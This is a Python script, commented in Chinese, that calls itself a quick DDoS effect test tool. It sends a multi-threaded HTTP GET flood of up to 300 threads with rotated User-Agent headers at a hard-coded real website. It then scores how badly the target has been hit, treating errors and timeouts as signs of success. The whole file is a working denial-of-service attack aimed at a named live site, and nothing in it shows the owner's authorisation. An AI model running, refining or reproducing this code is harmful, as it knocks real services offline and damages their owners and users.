#!/usr/bin/env python3
"""
快速DDoS效果测试工具
直接测试攻击效果，无需代理收集
"""

import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor

class QuickDDoSTest:
    def __init__(self, target_url):
        self.target_url = target_url
        self.attack_count = 0
        self.success_count = 0
        self.start_time = None
        
    def test_connection(self):
        """测试目标网站连通性"""
        print("🔍 测试目标网站连通性...")
        try:
            response = requests.get(self.target_url, timeout=10)
            print(f"✅ 目标网站可访问 - 状态码: {response.status_code}")
            print(f"📊 服务器: {response.headers.get('Server', '未知')}")
            print(f"🌐 响应时间: {response.elapsed.total_seconds():.2f}秒")
            return True
        except Exception as e:
            print(f"❌ 无法访问目标网站: {e}")
            return False
    
    def single_attack_thread(self, thread_id, requests_count=100):
        """单个攻击线程"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
        for i in range(requests_count):
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                
                response = requests.get(self.target_url, headers=headers, timeout=5)
                self.attack_count += 1
                self.success_count += 1
                
                if self.attack_count % 50 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.attack_count / elapsed if elapsed > 0 else 0
                    print(f"📊 线程{thread_id}: 已发送 {self.attack_count} 请求 | 成功率: {self.success_count/self.attack_count*100:.1f}% | 速率: {rate:.1f} req/s")
                    
            except requests.exceptions.Timeout:
                self.attack_count += 1
                print(f"⏰ 线程{thread_id}: 请求超时")
            except requests.exceptions.ConnectionError:
                self.attack_count += 1
                print(f"🔌 线程{thread_id}: 连接错误 - 可能目标已受影响")
            except Exception as e:
                self.attack_count += 1
                print(f"❌ 线程{thread_id}: 错误 - {e}")
    
    def start_quick_test(self, threads=200, duration=60):
        """启动快速测试"""
        print(f"🚀 启动快速DDoS效果测试")
        print(f"🎯 目标: {self.target_url}")
        print(f"⚡ 线程数: {threads}")
        print(f"⏱️ 持续时间: {duration}秒")
        print("-" * 50)
        
        # 测试连通性
        if not self.test_connection():
            print("⚠️ 目标不可达，停止测试")
            return
        
        self.start_time = time.time()
        
        # 计算每个线程的请求数
        requests_per_thread = max(10, duration * 2)
        
        # 启动攻击线程
        def run_attack(thread_id):
            self.single_attack_thread(thread_id, requests_per_thread)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # 启动所有线程
            futures = [executor.submit(run_attack, i) for i in range(threads)]
            
            # 等待指定时间
            time.sleep(duration)
            
            # 取消未完成的线程
            for future in futures:
                future.cancel()
        
        # 统计结果
        elapsed = time.time() - self.start_time
        success_rate = (self.success_count / self.attack_count * 100) if self.attack_count > 0 else 0
        request_rate = self.attack_count / elapsed if elapsed > 0 else 0
        
        print("\n" + "="*50)
        print("📊 DDoS攻击效果统计")
        print("="*50)
        print(f"🎯 目标网站: {self.target_url}")
        print(f"⏱️ 攻击时长: {elapsed:.1f}秒")
        print(f"📨 总请求数: {self.attack_count}")
        print(f"✅ 成功请求: {self.success_count}")
        print(f"📈 成功率: {success_rate:.1f}%")
        print(f"⚡ 请求速率: {request_rate:.1f} req/s")
        
        # 效果评估
        print("\n🔍 攻击效果评估:")
        if success_rate < 10:
            print("❌ 效果极差 - 目标可能已崩溃或具备强防护")
        elif success_rate < 50:
            print("⚠️ 效果一般 - 目标具备一定防护能力")
        elif success_rate < 80:
            print("✅ 效果良好 - 目标受到明显影响")
        else:
            print("🎯 效果优秀 - 目标基本无防护")
        
        if request_rate < 10:
            print("⚡ 攻击强度: 极低")
        elif request_rate < 100:
            print("⚡ 攻击强度: 低")
        elif request_rate < 500:
            print("⚡ 攻击强度: 中等")
        elif request_rate < 1000:
            print("⚡ 攻击强度: 高")
        else:
            print("💥 攻击强度: 极高")

def main():
    target = "https://www.kjqun.cn/"
    
    # 创建测试实例
    tester = QuickDDoSTest(target)
    
    # 启动快速测试
    tester.start_quick_test(threads=300, duration=30)  # 30秒快速测试

if __name__ == "__main__":
    main()